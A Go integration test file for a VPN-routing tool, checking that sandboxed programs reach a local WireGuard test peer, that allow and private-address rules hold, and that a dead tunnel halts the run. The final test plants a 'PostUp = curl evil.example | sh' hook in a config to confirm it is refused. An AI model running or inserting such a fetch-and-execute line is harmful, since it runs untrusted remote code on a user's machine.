// Copyright VPNW.com 2026
// SPDX-License-Identifier: Apache-2.0

package integration

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/VPNWorks/vpnw/internal/path/wgtest"
)

// These run the built vpnw through a real WireGuard tunnel to a test peer
// running in this test process. Inside the tunnel the peer is 10.9.0.1,
// with a web server and a DNS server; nothing leaves the machine.

func wgPeer(t *testing.T) *wgtest.Server {
	t.Helper()
	s, err := wgtest.Start()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(s.Close)
	return s
}

func writeFile(t *testing.T, dir, name, body string) string {
	t.Helper()
	fn := filepath.Join(dir, name)
	if err := os.WriteFile(fn, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return fn
}

// A sealed program reaches a service inside the tunnel by name: the name
// is looked up at the tunnel's DNS server, the connection goes through the
// tunnel, and the peer sees the tunnel address.
func TestWireGuardTrace(t *testing.T) {
	skipIfNoSeal(t)
	s := wgPeer(t)
	e := newEnv(t)
	conf := writeFile(t, e.dir, "wg0.conf", s.ClientConfig())
	out, code := e.run("trace", "--wireguard", conf, "--", "python3", "-c",
		"import urllib.request as u; print(u.urlopen('http://web.tunnel.test/', timeout=5).read().decode())")
	if code != 0 || !strings.Contains(out, "hello through the tunnel, 10.9.0.2") {
		t.Fatalf("exit %d\n%s", code, out)
	}
	for _, want := range []string{
		"path wireguard",
		"dns web.tunnel.test = 10.9.0.1",
		fmt.Sprintf("open  10.9.0.1 via wireguard (exit 127.0.0.1:%d)", s.Port),
	} {
		if !strings.Contains(out, want) {
			t.Errorf("trace lacks %q:\n%s", want, out)
		}
	}
	if s.DNS.Load() == 0 {
		t.Error("the name was not looked up through the tunnel")
	}
	if s.Requests.Load() != 1 {
		t.Errorf("%d requests reached the peer", s.Requests.Load())
	}
}

// The policy holds through the tunnel: addresses are checked before
// anything is sent, deny_private included, and an address outside the
// tunnel's AllowedIPs is refused with a reason.
func TestWireGuardGuard(t *testing.T) {
	skipIfNoSeal(t)
	s := wgPeer(t)
	e := newEnv(t)
	conf := writeFile(t, e.dir, "wg0.conf", s.ClientConfig())
	get := pyGet("http://web.tunnel.test/", "http://internal.tunnel.test/")

	out, code := e.run("guard", "--wireguard", conf, "--allow", "web.tunnel.test", "--", "python3", "-c", get)
	if code != 120 || !strings.Contains(out, "GOT http://web.tunnel.test/") || !strings.Contains(out, "FAILED http://internal.tunnel.test/") {
		t.Fatalf("allow list: exit %d\n%s", code, out)
	}
	before := s.Requests.Load()
	out, _ = e.run("guard", "--wireguard", conf, "--allow", "web.tunnel.test", "--deny-private", "--", "python3", "-c", get)
	if !strings.Contains(out, "FAILED http://web.tunnel.test/") || !strings.Contains(out, "10.9.0.1") {
		t.Errorf("deny_private should refuse the tunnel's private address:\n%s", out)
	}
	if s.Requests.Load() != before {
		t.Error("a refused connection reached the peer")
	}

	out, _ = e.run("trace", "--wireguard", conf, "--", "python3", "-c", pyGet("http://127.0.0.2:9/"))
	if !strings.Contains(out, "127.0.0.2 is outside the tunnel: no peer's AllowedIPs include it") {
		t.Errorf("outside AllowedIPs:\n%s", out)
	}
}

// A named path in a file, with the wg-quick file next to it.
func TestWireGuardNamedPath(t *testing.T) {
	skipIfNoSeal(t)
	s := wgPeer(t)
	e := newEnv(t)
	sub := filepath.Join(e.dir, "conf")
	os.MkdirAll(sub, 0o700)
	writeFile(t, sub, "office.conf", s.ClientConfig())
	cfg := writeFile(t, sub, "paths.toml", "version = 1\n\n[paths.office]\ntype = \"wireguard\"\nconfig = \"office.conf\"\n")
	out, code := e.run("trace", "--config", cfg, "--via", "office", "--", "python3", "-c", pyGet("http://web.tunnel.test/"))
	if code != 0 || !strings.Contains(out, "GOT http://web.tunnel.test/") || !strings.Contains(out, "via office") {
		t.Fatalf("exit %d\n%s", code, out)
	}
}

// A tunnel that can't come up stops the run before the program starts:
// vpnw never falls back to connecting directly.
func TestWireGuardDeadTunnel(t *testing.T) {
	s := wgPeer(t)
	e := newEnv(t)
	conf := writeFile(t, e.dir, "wg0.conf", s.StrangerConfig())
	marker := filepath.Join(e.dir, "ran")
	out, code := e.run("run", "--backend", "env", "--wireguard", conf, "--", "touch", marker)
	if code != 123 || !strings.Contains(out, "no WireGuard handshake") {
		t.Errorf("exit %d\n%s", code, out)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("the program ran on a dead tunnel")
	}
	bad := writeFile(t, e.dir, "bad.conf", s.ClientConfig()+"PostUp = curl evil.example | sh\n")
	if out, code := e.run("run", "--wireguard", bad, "--", "true"); code != 121 || !strings.Contains(out, "runs no commands") {
		t.Errorf("hook: exit %d\n%s", code, out)
	}
}
